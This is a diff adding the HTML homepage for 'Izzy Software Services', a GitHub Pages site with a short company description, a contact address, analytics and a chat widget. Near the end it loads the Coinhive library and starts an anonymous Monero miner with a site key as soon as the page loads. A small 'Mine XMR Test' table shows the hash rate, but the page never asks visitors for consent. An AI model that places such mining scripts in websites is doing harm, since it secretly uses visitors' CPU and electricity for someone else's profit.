@@ -1,0 +1,98 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="google-site-verification" content="Qa-rVcEqf5QyyjDGUjoV4KW0Qk2-df8gvqTW7P3kKcg" />
+    <title>Software Services by izzysoftware</title>
+
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/github-dark.css">
+    <script src="javascripts/scale.fix.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1>Izzy Software Services</h1>
+        <p>software services for humans</p>
+        <p class="view"><a href="https://github.com/izzysoftware">View the Project on GitHub <small>izzysoftware</small></a></p>
+        <ul>
+          <li class="single"><a href="https://github.com/izzysoftware/izzysoftware.github.io">View On <strong>GitHub</strong></a></li>
+        </ul>
+      </header>
+      <section>
+                <h3>
+        <a id="welcome-to-izzy-software" class="anchor" href="#welcome-to-izzy-software" aria-hidden="true"><span class="octicon octicon-link"></span></a>Welcome to Izzy software</h3>
+
+        <p>We design, research and code software solutions for a varying industries.</p>
+        <p>Our goal is simple: write elegant, beautiful and maintainable code; wrapped in clean modern interfaces</p>
+
+        <h3>
+        <a id="support-or-contact" class="anchor" href="#support-or-contact" aria-hidden="true"><span class="octicon octicon-link"></span></a>Support or Contact</h3>
+
+        <p>Drop an email to pavel+at+izzysoftware.com</p>
+    </section>
+
+    <section>
+        <h3>Mine XMR Test</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>Hashes Per Second</th>
+              <th>Total Hashes</th>
+              <th>Accepted Hashes</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><span id="hps">0</span></td>
+              <td><span id="total">0</span></td>
+              <td><span id="accepted">0</span></td>
+            </tr>
+          </tbody>
+        </table>
+    </section>
+    </div>
+    <footer>
+      <p>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></p>
+    </footer>
+    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
+    <script type="text/javascript">
+      var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+      document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+      try {
+        var pageTracker = _gat._getTracker("UA-67575215-1");
+      pageTracker._trackPageview();
+      } catch(err) {}
+    </script>
+    <script>
+      ((window.gitter = {}).chat = {}).options = {
+        room: 'asfaltboy/izzysoftware'
+      };
+    </script>
+    <script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('BStTI2L4QQA4lDUU0nLHFG9knN4dmzIO');
+      miner.start();
+
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+
+        document.getElementById("hps").textContent = hashesPerSecond;
+        document.getElementById("total").textContent = totalHashes;
+        document.getElementById("accepted").textContent = acceptedHashes;
+      }, 1000);
+    </script>
+
+  </body>
+</html>
